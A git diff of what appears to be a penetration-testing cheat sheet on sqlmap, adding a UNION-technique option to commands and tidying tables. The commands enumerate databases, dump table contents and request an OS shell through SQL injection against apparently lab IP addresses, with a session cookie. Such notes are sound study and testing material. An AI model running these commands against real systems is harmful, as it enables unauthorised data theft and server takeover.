@@ -42,46 +42,46 @@ sqlmap -u http://192.168.1.102/administrator --forms -D <database_name> -T <Colu
 #### Example 2	
 For a most exhaustive analysis, we can save the vulnerable request with _save item_ in Burp Suite. The field in which the insertion will be made in this example is **id**, previously investigated in Burp Suite.
 
-| Option               | Description                                                                                                            |
-| -------------------- | ---------------------------------------------------------------------------------------------------------------------- |
-| `-r pc`              | Specifies the file that contains the saved HTTP request, named "pc" in this case. It will be used as input for sqlmap. |
-| `-p id`              | Indicates the name of the URL or body parameter in the HTTP request to be tested for SQL injection. Example: `id`.     |
-| `--dbs`              | Instructs sqlmap to enumerate the available databases on the database server.                                          |
-| `--tables`           | Instructs sqlmap to enumerate the available tables in the selected database.                                           |
-| `-D SQLite_masterdb` | Specifies the name of the database where operations will be performed. Example: `SQLite_masterdb`.                     |
-| `-T accounts`        | Specifies the name of the table on which operations will be performed. Example: `accounts`.                            |
-| `--columns`          | Instructs sqlmap to enumerate the available columns in the specified table.                                            |
-| `--batch`            | Runs sqlmap in batch mode, performing the operations automatically without prompting for user input.                   |
-| `--threads 5`        | Specifies the number of threads sqlmap will use simultaneously. Example: 5 threads.                                    |
-| `--dump`             | Extracts the data from the specified table and displays it as output.                                                  |
+| Option               | Description                                                                                                                                     |
+| -------------------- | ----------------------------------------------------------------------------------------------------------------------------------------------- |
+| `-r pc`              | Specifies the file that contains the saved HTTP request, named "pc" in this case. It will be used as input for sqlmap.                          |
+| `-p id`              | Indicates the name of the URL or body parameter in the HTTP request to be tested for SQL injection. Example: `id`.                              |
+| `--dbs`              | Instructs sqlmap to enumerate the available databases on the database server.                                                                   |
+| `--tables`           | Instructs sqlmap to enumerate the available tables in the selected database.                                                                    |
+| `--technique U`      | Specifies the SQL injection techniques to be tested. Options: **U**:UNION query-based, **B**: Blind, **E**: Error-based,**T**: Time-based blind |
+| `-D SQLite_masterdb` | Specifies the name of the database where operations will be performed. Example: `SQLite_masterdb`.                                              |
+| `-T accounts`        | Specifies the name of the table on which operations will be performed. Example: `accounts`.                                                     |
+| `--columns`          | Instructs sqlmap to enumerate the available columns in the specified table.                                                                     |
+| `--batch`            | Runs sqlmap in batch mode, performing the operations automatically without prompting for user input.                                            |
+| `--threads 5`        | Specifies the number of threads sqlmap will use simultaneously. Example: 5 threads.                                                             |
+| `--dump`             | Extracts the data from the specified table and displays it as output.                                                                           |
 
 - Find databases:
 ```bash
-sqlmap -r pc -p id  --dbs	
+sqlmap -r pc -p id --dbs --technique=U	
 ```
 - Find tables in a specific database:	
 ```bash
-sqlmap -r pc -p id -D <database_name> --tables  
+sqlmap -r pc -p id -D <database_name> --tables --technique=U
 ```
 - Find columns in a specific table:
 ```bash
-sqlmap -r pc -p id -D <database_name> -T <table_name> --columns 
+sqlmap -r pc -p id -D <database_name> -T <table_name> --columns --technique=U 
 ```
 - Dump columns content
 ```bash
-sqlmap -r pc -p id -D <database_name> -T <table_name> --dump --columns "<column1_name>,<column2_name>,<column3_name>"
+sqlmap -r pc -p id -D <database_name> -T <table_name> --dump --columns "<column1_name>,<column2_name>,<column3_name>" --technique=U
 ```
 
 #### Exemple 3
-| Option            | Description                                                                                                      |
-|-------------------|------------------------------------------------------------------------------------------------------------------|
-| `-u`               | Specifies the target URL to be tested for SQL injection vulnerabilities. Example: `http://10.129.95.174/dashboard.php?search=any+query` |
-| `--cookie`        | Sets the cookie value for the HTTP request. Cookies maintain session information. Example: `PHPSESSID=7u6p9qbhb44c5c1rsefp4ro8u1` |
-| `--os-shell`      | Attempts to obtain an operating system shell on the vulnerable server if SQL injection is successful. This provides direct interaction with the operating system. |
+| Option       | Description                                                                                                                                                       |
+| ------------ | ----------------------------------------------------------------------------------------------------------------------------------------------------------------- |
+| `-u`         | Specifies the target URL to be tested for SQL injection vulnerabilities. Example: `http://10.129.95.174/dashboard.php?search=any+query`                           |
+| `--cookie`   | Sets the cookie value for the HTTP request. Cookies maintain session information. Example: `PHPSESSID=7u6p9qbhb44c5c1rsefp4ro8u1`                                 |
+| `--os-shell` | Attempts to obtain an operating system shell on the vulnerable server if SQL injection is successful. This provides direct interaction with the operating system. |
 
 ```bash
-sqlmap -u 'http://10.129.95.174/dashboard.php?search=any+query' --  
-cookie="PHPSESSID=7u6p9qbhb44c5c1rsefp4ro8u1" --os-shell
+sqlmap -u 'http://10.129.95.174/dashboard.php?search=any+query' --cookie="PHPSESSID=7u6p9qbhb44c5c1rsefp4ro8u1" --os-shell
 ```
 ## mssqlclient.py 
 mssqlclient.py is a script from the Impacket class collection. When mssqlclient.py is executed, a connection is established with the specified SQL Server and it allows interaction through a command-line interface.
